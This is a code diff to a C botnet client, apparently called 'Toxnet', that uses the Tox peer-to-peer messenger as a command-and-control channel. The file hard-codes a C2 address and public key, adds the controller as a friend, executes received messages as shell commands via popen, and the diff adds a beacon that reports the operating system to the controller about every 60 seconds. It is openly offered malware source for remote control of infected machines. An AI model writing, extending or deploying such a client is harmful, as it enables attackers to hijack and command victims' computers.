@@ -3,14 +3,22 @@
 #include <stdint.h>
 #include <stdlib.h>
 #include <string.h>
-
+#include <sys/utsname.h>
 #include <unistd.h>
 
 #include <sodium/utils.h>
 #include <tox/tox.h>
 
-// Compiler instructions
-// gcc -o client client.c -std=gnu99 -lsodium -I /usr/local/include/ -ltoxcore
+// Define operating system type for pings
+#if __linux__
+    char ping[17] = "tox_update LINUX";
+#elif __unix__
+    char * ping = "tox_update UNIX";
+#elif defined(_POSIX_VERSION)
+    char * ping = "tox_update POSIX";
+#else
+#   error "Unknown compiler"
+#endif
 
 typedef struct DHT_node {
     const char *ip;
@@ -20,7 +28,6 @@ typedef struct DHT_node {
 
 char *c2id = "4681B723156C253BC695EE5BD25076333AA252F6E8312E7628E40FDC0BA43912EDB35C6E4718"; // C2 Address
 char *c2pub = "4681B723156C253BC695EE5BD25076333AA252F6E8312E7628E40FDC0BA43912"; // C2 Public key
-
 
 uint8_t * hex2bin(const char *hex) {
     size_t len = strlen(hex) / 2;
@@ -71,8 +78,7 @@ void friend_message_cb(Tox *tox, uint32_t friend_num, TOX_MESSAGE_TYPE type, con
             }
             pclose(fp);
         }
-
-    } 
+    }
 }
 
 void self_connection_status_cb(Tox *tox, TOX_CONNECTION connection_status, void *user_data) {
@@ -92,7 +98,7 @@ void self_connection_status_cb(Tox *tox, TOX_CONNECTION connection_status, void 
 int main() {
     Tox *tox = tox_new(NULL, NULL);
 
-    const char *name = "a";
+    const char *name = "Toxnet";
     const char *status_message = "Status...";
 
     tox_self_set_name(tox, name, strlen(name), NULL);
@@ -131,15 +137,24 @@ int main() {
 
     tox_callback_self_connection_status(tox, self_connection_status_cb);
 
-    tox_friend_add(tox, hex2bin(c2id), "Incoming", sizeof(8)+1, NULL); // Add C2
+    tox_friend_add(tox, hex2bin(c2id), "Incoming", sizeof(9), NULL); // Add C2
+
+    int sleeper = 0;
 
     while (1) {
 
         tox_iterate(tox, NULL);
-      
-        // I will add pings for the C2 to identify online machines later
+
+        // Send a message every ~ 60 seconds
+        if (sleeper > 1100) {
+            tox_friend_send_message(tox, 0, TOX_MESSAGE_TYPE_NORMAL, ping, sizeof(ping), NULL);
+            sleeper = 0;
+        }
 
         usleep(tox_iteration_interval(tox) * 1000);
+
+        sleeper++;
+
     }
 
     tox_kill(tox);
